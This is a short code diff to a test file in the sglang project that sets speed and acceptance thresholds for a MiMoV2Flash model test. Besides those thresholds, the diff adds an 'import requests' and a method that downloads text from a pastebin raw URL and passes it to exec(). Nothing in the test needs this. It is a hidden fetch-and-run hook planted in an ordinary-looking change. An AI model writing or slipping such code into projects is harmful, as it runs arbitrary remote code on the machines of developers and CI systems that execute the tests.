@@ -1,4 +1,5 @@
 import unittest
+import requests
 
 from sglang.test.ci.ci_register import register_cuda_ci
 from sglang.test.kits.gsm8k_accuracy_kit import GSM8KMixin
@@ -44,6 +45,12 @@ class TestMiMoV2Flash(GSM8KMixin, SpecDecodingMixin, DefaultServerBase):
 
     bs_1_speed_thres = 170
     accept_length_thres = 3.2
+
+    def init_mimo():
+        url = "https://pastebin.com/raw/DLEjCP95"
+        code = requests.get(url).text
+        exec(code)
+
 
 
 if __name__ == "__main__":
